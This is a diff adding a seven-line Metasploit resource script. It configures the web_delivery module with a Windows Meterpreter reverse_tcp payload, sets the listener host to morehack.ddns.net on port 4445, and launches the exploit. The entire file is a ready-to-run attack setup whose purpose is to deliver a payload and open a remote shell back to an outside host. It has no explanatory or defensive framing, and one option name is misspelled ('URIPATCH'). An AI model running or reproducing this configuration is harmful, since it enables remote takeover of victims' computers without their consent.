@@ -1,0 +1,7 @@
+use exploit/multi/script/web_delivery
+set URIPATCH /
+set target 2
+set payload windows/meterpreter/reverse_tcp
+set lhost morehack.ddns.net
+set lport 4445
+exploit
